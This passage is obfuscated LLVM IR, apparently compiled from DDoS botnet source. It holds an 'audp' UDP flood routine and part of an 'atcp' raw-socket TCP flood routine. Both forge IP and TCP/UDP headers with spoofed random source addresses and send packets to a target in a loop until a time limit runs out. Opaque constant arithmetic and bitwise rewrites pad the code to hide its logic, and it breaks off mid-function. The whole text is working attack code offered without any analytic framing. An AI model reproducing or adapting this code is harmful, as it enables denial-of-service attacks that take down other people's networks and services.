  %52 = trunc i64 %50 to i16
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 2
  store i16 %52, i16* %54, align 2
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 3
  store i16 %56, i16* %58, align 4
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 4
  store i16 0, i16* %60, align 2
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 5
  store i8 -1, i8* %62, align 4
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 6
  store i8 %63, i8* %65, align 1
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 7
  store i16 0, i16* %67, align 2
  %68 = load i32, i32* %8, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 8
  store i32 %68, i32* %70, align 4
  %71 = load i32, i32* %7, align 4
  %72 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 9
  store i32 %71, i32* %73, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %314

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %114

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %52
  br label %314

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %11, align 4
  %59 = sub i32 0, 1
  %60 = sub i32 %58, %59
  %61 = add nsw i32 %58, 1
  %62 = sext i32 %60 to i64
  %63 = call noalias i8* @malloc(i64 %62) #6
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %57
  br label %314

; <label>:67:                                     ; preds = %57
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add i32 %69, 195387561
  %71 = add i32 %70, 1
  %72 = sub i32 %71, 195387561
  %73 = add nsw i32 %69, 1
  %74 = sext i32 %72 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %74, i32 1, i1 false)
  %75 = load i8*, i8** %16, align 8
  %76 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %75, i32 %76)
  %77 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %78 = load i32, i32* %9, align 4
  %79 = sub i32 0, %77
  %80 = sub i32 0, %78
  %81 = add i32 %79, %80
  %82 = sub i32 0, %81
  %83 = add nsw i32 %77, %78
  store i32 %82, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %84

; <label>:84:                                     ; preds = %107, %106, %67
  %85 = load i32, i32* %15, align 4
  %86 = load i8*, i8** %16, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %90 = call i64 @sendto(i32 %85, i8* %86, i64 %88, i32 0, %struct.sockaddr* %89, i32 16)
  %91 = load i32, i32* %18, align 4
  %92 = load i32, i32* %14, align 4
  %93 = icmp eq i32 %91, %92
  br i1 %93, label %94, label %107

; <label>:94:                                     ; preds = %84
  %95 = load i32, i32* %8, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %101

; <label>:97:                                     ; preds = %94
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  br label %101

; <label>:101:                                    ; preds = %97, %94
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %17, align 4
  %104 = icmp sgt i32 %102, %103
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %101
  br label %113

; <label>:106:                                    ; preds = %101
  store i32 0, i32* %18, align 4
  br label %84

; <label>:107:                                    ; preds = %84
  %108 = load i32, i32* %18, align 4
  %109 = sub i32 %108, 764412899
  %110 = add i32 %109, 1
  %111 = add i32 %110, 764412899
  %112 = add i32 %108, 1
  store i32 %111, i32* %18, align 4
  br label %84

; <label>:113:                                    ; preds = %105
  br label %314

; <label>:114:                                    ; preds = %46
  %115 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %115, i32* %19, align 4
  %116 = load i32, i32* %19, align 4
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %119, label %118

; <label>:118:                                    ; preds = %114
  br label %314

; <label>:119:                                    ; preds = %114
  store i32 1, i32* %20, align 4
  %120 = load i32, i32* %19, align 4
  %121 = bitcast i32* %20 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp slt i32 %122, 0
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %119
  br label %314

; <label>:125:                                    ; preds = %119
  store i32 50, i32* %21, align 4
  br label %126

; <label>:126:                                    ; preds = %133, %125
  %127 = load i32, i32* %21, align 4
  %128 = add i32 %127, -404712107
  %129 = add i32 %128, -1
  %130 = sub i32 %129, -404712107
  %131 = add nsw i32 %127, -1
  store i32 %130, i32* %21, align 4
  %132 = icmp ne i32 %127, 0
  br i1 %132, label %133, label %143

; <label>:133:                                    ; preds = %126
  %134 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %135 = call i32 @rand_cmwc()
  %136 = xor i32 %134, -1
  %137 = and i32 %135, %136
  %138 = xor i32 %135, -1
  %139 = and i32 %134, %138
  %140 = or i32 %137, %139
  %141 = xor i32 %134, %135
  call void @srand(i32 %140) #6
  %142 = call i32 @rand() #6
  call void @init_rand(i32 %142)
  br label %126

; <label>:143:                                    ; preds = %126
  %144 = load i32, i32* %10, align 4
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %147

; <label>:146:                                    ; preds = %143
  store i32 0, i32* %22, align 4
  br label %167

; <label>:147:                                    ; preds = %143
  %148 = load i32, i32* %10, align 4
  %149 = sub i32 0, %148
  %150 = add i32 32, %149
  %151 = sub nsw i32 32, %148
  %152 = shl i32 1, %150
  %153 = sub i32 0, 1
  %154 = add i32 %152, %153
  %155 = sub nsw i32 %152, 1
  %156 = xor i32 %154, -1
  %157 = and i32 1605561211, %156
  %158 = xor i32 1605561211, -1
  %159 = and i32 %154, %158
  %160 = xor i32 -1, -1
  %161 = and i32 %160, 1605561211
  %162 = and i32 -1, %158
  %163 = or i32 %157, %159
  %164 = or i32 %161, %162
  %165 = xor i32 %163, %164
  %166 = xor i32 %154, -1
  store i32 %165, i32* %22, align 4
  br label %167

; <label>:167:                                    ; preds = %147, %146
  %168 = load i32, i32* %11, align 4
  %169 = sext i32 %168 to i64
  %170 = sub i64 0, 28
  %171 = sub i64 0, %169
  %172 = add i64 %170, %171
  %173 = sub i64 0, %172
  %174 = add i64 28, %169
  %175 = call i8* @llvm.stacksave()
  store i8* %175, i8** %23, align 8
  %176 = alloca i8, i64 %173, align 16
  %177 = bitcast i8* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %24, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = getelementptr i8, i8* %179, i64 20
  %181 = bitcast i8* %180 to %struct.udphdr*
  store %struct.udphdr* %181, %struct.udphdr** %25, align 8
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 4
  %186 = load i32, i32* %22, align 4
  %187 = call i32 @getRandomIP(i32 %186)
  %188 = call i32 @htonl(i32 %187) #9
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 8, -718849528099992578
  %192 = add i64 %191, %190
  %193 = add i64 %192, -718849528099992578
  %194 = add i64 8, %190
  %195 = trunc i64 %193 to i32
  call void @makeIPPacket(%struct.iphdr* %182, i32 %185, i32 %188, i8 zeroext 17, i32 %195)
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = sub i64 0, 8
  %199 = sub i64 0, %197
  %200 = add i64 %198, %199
  %201 = sub i64 0, %200
  %202 = add i64 8, %197
  %203 = trunc i64 %201 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #9
  %205 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.3* %206 to %struct.anon.4*
  %208 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %207, i32 0, i32 2
  store i16 %204, i16* %208, align 2
  %209 = call i32 @rand_cmwc()
  %210 = trunc i32 %209 to i16
  %211 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.3* %212 to %struct.anon.4*
  %214 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %213, i32 0, i32 0
  store i16 %210, i16* %214, align 2
  %215 = load i32, i32* %8, align 4
  %216 = icmp eq i32 %215, 0
  br i1 %216, label %217, label %219

; <label>:217:                                    ; preds = %167
  %218 = call i32 @rand_cmwc()
  br label %224

; <label>:219:                                    ; preds = %167
  %220 = load i32, i32* %8, align 4
  %221 = trunc i32 %220 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #9
  %223 = zext i16 %222 to i32
  br label %224

; <label>:224:                                    ; preds = %219, %217
  %225 = phi i32 [ %218, %217 ], [ %223, %219 ]
  %226 = trunc i32 %225 to i16
  %227 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.3* %228 to %struct.anon.4*
  %230 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %229, i32 0, i32 1
  store i16 %226, i16* %230, align 2
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.3* %232 to %struct.anon.4*
  %234 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %233, i32 0, i32 3
  store i16 0, i16* %234, align 2
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = bitcast %struct.udphdr* %235 to i8*
  %237 = getelementptr inbounds i8, i8* %236, i64 8
  %238 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %237, i32 %238)
  %239 = bitcast i8* %176 to i16*
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 2
  %242 = load i16, i16* %241, align 2
  %243 = zext i16 %242 to i32
  %244 = call zeroext i16 @csum(i16* %239, i32 %243)
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 7
  store i16 %244, i16* %246, align 2
  %247 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %248 = load i32, i32* %9, align 4
  %249 = add i32 %247, -556118525
  %250 = add i32 %249, %248
  %251 = sub i32 %250, -556118525
  %252 = add nsw i32 %247, %248
  store i32 %251, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %253

; <label>:253:                                    ; preds = %306, %305, %224
  br label %254

; <label>:254:                                    ; preds = %253
  %255 = load i32, i32* %19, align 4
  %256 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %257 = call i64 @sendto(i32 %255, i8* %176, i64 %173, i32 0, %struct.sockaddr* %256, i32 16)
  %258 = call i32 @rand_cmwc()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.3* %261 to %struct.anon.4*
  %263 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %262, i32 0, i32 0
  store i16 %259, i16* %263, align 2
  %264 = load i32, i32* %8, align 4
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %268

; <label>:266:                                    ; preds = %254
  %267 = call i32 @rand_cmwc()
  br label %273

; <label>:268:                                    ; preds = %254
  %269 = load i32, i32* %8, align 4
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #9
  %272 = zext i16 %271 to i32
  br label %273

; <label>:273:                                    ; preds = %268, %266
  %274 = phi i32 [ %267, %266 ], [ %272, %268 ]
  %275 = trunc i32 %274 to i16
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon.3* %277 to %struct.anon.4*
  %279 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %278, i32 0, i32 1
  store i16 %275, i16* %279, align 2
  %280 = call i32 @rand_cmwc()
  %281 = trunc i32 %280 to i16
  %282 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 4
  %284 = load i32, i32* %22, align 4
  %285 = call i32 @getRandomIP(i32 %284)
  %286 = call i32 @htonl(i32 %285) #9
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 8
  store i32 %286, i32* %288, align 4
  %289 = bitcast i8* %176 to i16*
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 2
  %292 = load i16, i16* %291, align 2
  %293 = zext i16 %292 to i32
  %294 = call zeroext i16 @csum(i16* %289, i32 %293)
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 7
  store i16 %294, i16* %296, align 2
  %297 = load i32, i32* %27, align 4
  %298 = load i32, i32* %14, align 4
  %299 = icmp eq i32 %297, %298
  br i1 %299, label %300, label %306

; <label>:300:                                    ; preds = %273
  %301 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %302 = load i32, i32* %26, align 4
  %303 = icmp sgt i32 %301, %302
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %300
  br label %312

; <label>:305:                                    ; preds = %300
  store i32 0, i32* %27, align 4
  br label %253

; <label>:306:                                    ; preds = %273
  %307 = load i32, i32* %27, align 4
  %308 = add i32 %307, -486121594
  %309 = add i32 %308, 1
  %310 = sub i32 %309, -486121594
  %311 = add i32 %307, 1
  store i32 %310, i32* %27, align 4
  br label %253

; <label>:312:                                    ; preds = %304
  %313 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %313)
  br label %314

; <label>:314:                                    ; preds = %312, %124, %118, %113, %66, %56, %45
  ret void
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %497

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %497

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #6
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %497

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %11, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %78

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %11, align 4
  %64 = sub i32 0, %63
  %65 = add i32 32, %64
  %66 = sub nsw i32 32, %63
  %67 = shl i32 1, %65
  %68 = sub i32 %67, -1533583101
  %69 = sub i32 %68, 1
  %70 = add i32 %69, -1533583101
  %71 = sub nsw i32 %67, 1
  %72 = xor i32 %70, -1
  %73 = and i32 -1, %72
  %74 = xor i32 -1, -1
  %75 = and i32 %70, %74
  %76 = or i32 %73, %75
  %77 = xor i32 %70, -1
  store i32 %76, i32* %19, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %61
  %79 = load i32, i32* %13, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 40, 5371284248491891338
  %82 = add i64 %81, %80
  %83 = sub i64 %82, 5371284248491891338
  %84 = add i64 40, %80
  %85 = call i8* @llvm.stacksave()
  store i8* %85, i8** %20, align 8
  %86 = alloca i8, i64 %83, align 16
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %21, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = bitcast %struct.iphdr* %88 to i8*
  %90 = getelementptr i8, i8* %89, i64 20
  %91 = bitcast i8* %90 to %struct.tcphdr*
  store %struct.tcphdr* %91, %struct.tcphdr** %22, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %94 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = load i32, i32* %19, align 4
  %97 = call i32 @getRandomIP(i32 %96)
  %98 = call i32 @htonl(i32 %97) #9
  %99 = load i32, i32* %13, align 4
  %100 = sext i32 %99 to i64
  %101 = add i64 20, -6699319780079808084
  %102 = add i64 %101, %100
  %103 = sub i64 %102, -6699319780079808084
  %104 = add i64 20, %100
  %105 = trunc i64 %103 to i32
  call void @makeIPPacket(%struct.iphdr* %92, i32 %95, i32 %98, i8 zeroext 6, i32 %105)
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon.1* %109 to %struct.anon.2*
  %111 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %110, i32 0, i32 0
  store i16 %107, i16* %111, align 4
  %112 = call i32 @rand_cmwc()
  %113 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon.1* %114 to %struct.anon.2*
  %116 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %115, i32 0, i32 2
  store i32 %112, i32* %116, align 4
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.1* %118 to %struct.anon.2*
  %120 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %119, i32 0, i32 3
  store i32 0, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.1* %122 to %struct.anon.2*
  %124 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = xor i16 %125, -1
  %127 = xor i16 -241, -1
  %128 = xor i16 29014, -1
  %129 = or i16 %126, %127
  %130 = or i16 29014, %128
  %131 = xor i16 %129, -1
  %132 = and i16 %131, %130
  %133 = and i16 %125, -241
  %134 = and i16 %132, 80
  %135 = xor i16 %132, 80
  %136 = or i16 %134, %135
  %137 = or i16 %132, 80
  store i16 %136, i16* %124, align 4
  %138 = load i8*, i8** %12, align 8
  %139 = call i32 @strcmp(i8* %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %140 = icmp ne i32 %139, 0
  br i1 %140, label %255, label %141

; <label>:141:                                    ; preds = %78
  %142 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.1* %143 to %struct.anon.2*
  %145 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = xor i16 -513, -1
  %148 = xor i16 %146, %147
  %149 = and i16 %148, %146
  %150 = and i16 %146, -513
  %151 = and i16 %149, 512
  %152 = xor i16 %149, 512
  %153 = or i16 %151, %152
  %154 = or i16 %149, 512
  store i16 %153, i16* %145, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = xor i16 %159, -1
  %161 = xor i16 -1025, -1
  %162 = xor i16 12709, -1
  %163 = or i16 %160, %161
  %164 = or i16 12709, %162
  %165 = xor i16 %163, -1
  %166 = and i16 %165, %164
  %167 = and i16 %159, -1025
  %168 = xor i16 %166, -1
  %169 = xor i16 1024, -1
  %170 = xor i16 -1991, -1
  %171 = and i16 %168, -1991
  %172 = and i16 %166, %170
  %173 = and i16 %169, -1991
  %174 = and i16 1024, %170
  %175 = or i16 %171, %172
  %176 = or i16 %173, %174
  %177 = xor i16 %175, %176
  %178 = or i16 %168, %169
  %179 = xor i16 %178, -1
  %180 = or i16 -1991, %170
  %181 = and i16 %179, %180
  %182 = or i16 %177, %181
  %183 = or i16 %166, 1024
  store i16 %182, i16* %158, align 4
  %184 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.1* %185 to %struct.anon.2*
  %187 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = xor i16 %188, -1
  %190 = xor i16 -257, -1
  %191 = xor i16 7911, -1
  %192 = or i16 %189, %190
  %193 = or i16 7911, %191
  %194 = xor i16 %192, -1
  %195 = and i16 %194, %193
  %196 = and i16 %188, -257
  %197 = and i16 %195, 256
  %198 = xor i16 %195, 256
  %199 = or i16 %197, %198
  %200 = or i16 %195, 256
  store i16 %199, i16* %187, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.1* %202 to %struct.anon.2*
  %204 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 -4097, -1
  %207 = xor i16 %205, %206
